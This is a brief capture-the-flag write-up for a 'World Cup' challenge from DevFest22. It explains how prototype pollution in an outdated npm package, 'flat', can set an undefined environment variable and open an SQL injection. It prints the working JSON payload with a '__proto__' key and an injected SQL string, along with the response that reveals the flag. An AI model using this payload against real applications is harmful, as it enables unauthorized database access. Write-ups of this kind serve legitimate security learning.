# World Cup

## Write-up (brief)

1. Prototype pollution in outdated npm package `flat`
2. Pollute undefined property `process.env.TABLE_NAME` to unlock SQL injection in `database.js` (`getCountry` function)
3. Payload:

```json
{
  "country.name": "Qatar",
  "__proto__.TABLE_NAME":"teams WHERE code = 'FLAG' and name != ?; --"
}
```

4. Response:

```json
{
  "name":"DevFest22{p0LLutED_iNJ3ct10N_ftW}",
  "code":"FLAG"
}
```
